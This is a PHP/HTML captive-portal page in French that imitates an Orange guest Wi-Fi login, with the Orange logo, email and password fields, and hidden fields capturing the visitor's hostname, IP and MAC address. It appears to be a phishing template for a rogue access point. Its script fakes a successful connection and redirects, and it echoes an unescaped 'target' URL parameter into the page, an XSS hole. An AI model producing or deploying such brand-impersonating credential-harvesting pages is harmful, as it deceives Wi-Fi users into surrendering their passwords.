<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Portail Captif – Accès invité</title>
<style>
/* === GLOBAL === */
* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
body {
  margin:0; font-family: 'Arial', sans-serif;
  color:white; background:#111;
  display:flex; justify-content:center; align-items:center;
  min-height:100vh; overflow:hidden;
}

/* === BACKGROUND === */
body::before {
  content:"";
  position:fixed; inset:0;
  background: radial-gradient(circle at 25% 25%, rgba(255,122,0,0.12), transparent 25%),
              radial-gradient(circle at 75% 75%, rgba(255,178,107,0.08), transparent 25%);
  z-index:-3;
  animation:bgFloat 12s ease-in-out infinite alternate;
}
@keyframes bgFloat {
  0% {transform:translate(0,0) rotate(0);}
  50% {transform:translate(20px,-10px) rotate(5deg);}
  100% {transform:translate(0,10px) rotate(0);}
}

/* === CARD === */
.card-3d {
  background: rgba(30,30,30,0.85);
  backdrop-filter: blur(6px);
  border-radius: 1rem;
  padding: 1.8rem;
  width: 90%;
  max-width: 380px;
  box-shadow: 0 8px 24px rgba(0,0,0,0.6);
  position: relative;
  transition: transform 0.1s ease-out;
  text-align:center;
}

/* === HEADER === */
h1 {
  color:#ff7a00; font-size:1.8rem; margin:0.5rem 0;
}
p {
  color:#ccc; font-size:0.9rem; margin-bottom:1.2rem;
}

/* === FORM === */
label {
  display:block; text-align:left;
  font-size:0.85rem; color:#aaa; margin-bottom:0.25rem;
}
input[type="email"], input[type="password"] {
  width:100%; padding:0.7rem 1rem;
  border-radius:0.5rem;
  border:1px solid #444;
  background:rgba(50,50,50,0.8);
  color:white;
  margin-bottom:1rem;
  font-size:1rem;
}
input:focus { outline:2px solid #ff7a00; }

/* === BUTTONS === */
button {
  border:none; border-radius:0.5rem;
  font-weight:bold; cursor:pointer;
  transition: background 0.2s ease;
}
button.primary {
  width:100%; padding:0.8rem;
  background:#ff7a00; color:#111;
  display:flex; justify-content:center; align-items:center;
  gap:0.5rem; margin-bottom:0.6rem;
}
button.primary:hover, button.primary:active { background:#cc5e00; }

button.secondary {
  width:100%; padding:0.8rem;
  border:1px solid #666; color:#ccc; background:transparent;
}
button.secondary:hover, button.secondary:active { border-color:#ff7a00; color:#fff; }

/* === PASSWORD TOGGLE === */
#togglePw {
  position:absolute; top:0.6rem; right:0.6rem;
  background:none; color:#aaa; font-size:1.1rem; cursor:pointer;
}

/* === LOADER === */
.loader {
  width:18px; height:18px;
  border-radius:50%;
  border:3px solid rgba(255,255,255,0.2);
  border-top-color:white;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }

/* === SUCCESS === */
#successBurst {
  position:absolute; inset:0;
  display:flex; justify-content:center; align-items:center;
  opacity:0; transform:scale(0.95);
  pointer-events:none;
  transition: opacity 0.3s ease, transform 0.4s ease;
}
#successBurst.show {
  opacity:1; transform:scale(1);
}

/* === ORBS === */
.orb {
  position:absolute;
  width:15px; height:15px; border-radius:50%;
  background:radial-gradient(circle, #ff7a00 0%, #ffb26b 80%);
  opacity:0.8; z-index:5;
}

/* === MOBILE === */
@media (max-width:480px){
  h1{font-size:1.6rem;}
  input, button{font-size:0.95rem;}
}
</style>
</head>
<body>

<!-- SUCCESS BURST -->
<div id="successBurst">
  <div style="width:96px; height:96px; border-radius:50%; background:linear-gradient(45deg,#ff7a00,#ffb26b); display:flex; justify-content:center; align-items:center; font-size:2.5rem; font-weight:bold; color:#111;">✓</div>
</div>

<!-- ORBS -->
<div id="orbsContainer"></div>

<!-- CARD -->
<div id="card" class="card-3d">
  <div style="margin-bottom:1rem;">
    <img src="assets/orange_logo.png" alt="Logo Orange" style="width:110px; border:2px solid #ff7a00; border-radius:8px;">
  </div>
  <h1>Accès Wi-Fi invité</h1>
  <p>Connectez-vous pour accéder à Internet en toute sécurité.</p>

  <form id="loginForm" method="POST" action="/captiveportal/index.php">
    <input type="hidden" name="hostname" value="<?= gethostbyaddr($_SERVER['REMOTE_ADDR']); ?>">
    <input type="hidden" name="ip" value="<?= $_SERVER['REMOTE_ADDR']; ?>">
    <input type="hidden" name="mac" value="<?= $_SERVER['HTTP_X_CLIENT_MAC'] ?? ''; ?>">
    <input type="hidden" name="target" value="<?= $_GET['target'] ?? '/'; ?>">

    <label for="email">Adresse e-mail</label>
    <input type="email" id="email" name="email" required>

    <label for="password">Mot de passe</label>
    <div style="position:relative;">
      <input type="password" id="password" name="password" required style="padding-right:2.5rem;">
      <button type="button" id="togglePw">👁️</button>
    </div>

    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
      <label style="font-size:0.85rem; color:#ccc;">
        <input type="checkbox" name="remember" style="margin-right:0.3rem;"> Se souvenir de moi
      </label>
      <a href="#" style="color:#ff7a00; font-size:0.85rem; text-decoration:underline;">Besoin d'aide ?</a>
    </div>

    <button type="submit" id="submitBtn" class="primary">
      <span id="btnLabel">Se connecter</span>
      <span id="btnLoader" style="display:none;"><span class="loader"></span></span>
    </button>

    <button type="button" id="guestBtn" class="secondary">Connexion invitée</button>

    <p style="color:#888; font-size:0.75rem; margin-top:1rem;">En vous connectant, vous acceptez les conditions d'utilisation du réseau local.</p>
  </form>
</div>

<script>
const togglePw=document.getElementById('togglePw');
const pw=document.getElementById('password');
togglePw.addEventListener('click',()=>{
  if(pw.type==='password'){pw.type='text';togglePw.textContent='🙈';}
  else{pw.type='password';togglePw.textContent='👁️';}
});

const form=document.getElementById('loginForm');
const submitBtn=document.getElementById('submitBtn');
const btnLabel=document.getElementById('btnLabel');
const btnLoader=document.getElementById('btnLoader');
const successBurst=document.getElementById('successBurst');
const guestBtn=document.getElementById('guestBtn');
const card=document.getElementById('card');
const orbsContainer=document.getElementById('orbsContainer');

// Orbs
const orbs=[];
for(let i=0;i<8;i++){
  const o=document.createElement('div');
  o.className='orb';
  o.style.left=Math.random()*100+'%';
  o.style.top=Math.random()*100+'%';
  orbsContainer.appendChild(o);
  orbs.push(o);
}

// 3D + Orb movement
function updateEffect(x,y){
  card.style.transform=`rotateX(${x}deg) rotateY(${y}deg)`;
  orbs.forEach((orb,i)=>{
    const offset=8+i*1.5;
    orb.style.transform=`translate(${y*offset}px,${x*offset}px)`;
  });
}
window.addEventListener('mousemove',e=>{
  const cx=window.innerWidth/2, cy=window.innerHeight/2;
  const dx=(e.clientX-cx)/cx*10, dy=(e.clientY-cy)/cy*10;
  updateEffect(dy,dx);
});
window.addEventListener('deviceorientation',e=>{
  const x=e.beta?(e.beta-45)/45*10:0;
  const y=e.gamma?e.gamma/45*10:0;
  updateEffect(x,y);
});

// Connexion simulation
function showSuccess(msg,redirect='/'){
  btnLoader.style.display='none';
  btnLabel.textContent=msg;
  successBurst.classList.add('show');
  setTimeout(()=>window.location.href=redirect,900);
}
form.addEventListener('submit',e=>{
  e.preventDefault();
  btnLoader.style.display='inline-block';
  btnLabel.textContent='Connexion...';
  submitBtn.disabled=true;
  setTimeout(()=>showSuccess('Connecté',form.target?.value||'/'),1000);
});
guestBtn.addEventListener('click',()=>{
  btnLoader.style.display='inline-block';
  btnLabel.textContent='Connexion invitée...';
  submitBtn.disabled=true;
  setTimeout(()=>showSuccess('Invité connecté','/'),900);
});
</script>

</body>
</html>

